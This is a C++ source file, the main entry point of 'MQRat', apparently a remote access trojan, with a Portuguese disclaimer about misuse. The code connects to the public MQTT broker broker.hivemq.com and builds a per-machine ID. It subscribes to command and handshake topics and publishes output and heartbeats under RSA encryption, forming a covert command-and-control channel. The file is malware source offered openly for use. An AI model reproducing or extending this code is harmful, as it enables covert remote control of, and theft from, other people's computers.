/*
	This file is part of MQRat.
	
	Copyright (C) 2019  MQRat Project

	O autor não se responsabiliza por variantes (ou sources originais) deste software 
	que estejam sendo utilizadas para prejudicar terceiros.
*/

#ifndef __cplusplus
#error "We need a C++ compiler"
#endif

#include <thread>
#include <string>
#include <functional>
#include <csignal>
#include "mqtt_client.hpp"
#include "log.hpp"
#include "utils.hpp"
#include "network.hpp"
#include "crypto.hpp"

using namespace std;

void sigsegv_handler(int s) {
	Log::LogPanic("Segmentation fault detected");
}

int main() {
	string topic_name = "mqrat/cmd/";
	unsigned QoS = 0;
	MqttClient *client = nullptr;
	Crypto::RSACipher *cipher = new Crypto::RSACipher();

	if(!cipher) {
		Log::LogPanic("Failed to allocate memory for RSA Cipher object");
	}

	signal(SIGSEGV, sigsegv_handler);

	client = new MqttClient(QoS, "tcp://broker.hivemq.com:1883", cipher);
	if(!client) {
		Log::LogPanic("Failed to initialize MQTT client");
	}

    // Configure MQTT client
    client->Setup();

	// Generate send and receive topic
	auto heartbeat_topic = topic_name + Utils::GenerateID();
	auto recv_topic = heartbeat_topic + "/command";
	auto send_topic = heartbeat_topic + "/output";
	auto handshake_topic = heartbeat_topic + "/hs";

	client->setRecvTopic(recv_topic);
	client->setSendTopic(send_topic);
	client->setHeartbeatTopic(heartbeat_topic);
	client->setHandshakeTopic(handshake_topic);

	// Connect to broker
	client->Connect();

	// Subscribe to topic where command will be received
	client->Subscribe(recv_topic);
	client->Subscribe(handshake_topic);

	// Internal loop
	std::thread mqtt_thread(&MqttClient::Loop, client);

	Log::LogInfo("Started MQTT client thread");
	if(mqtt_thread.joinable())
		mqtt_thread.join();

	// Free resources
	delete cipher;

    return 0;
}
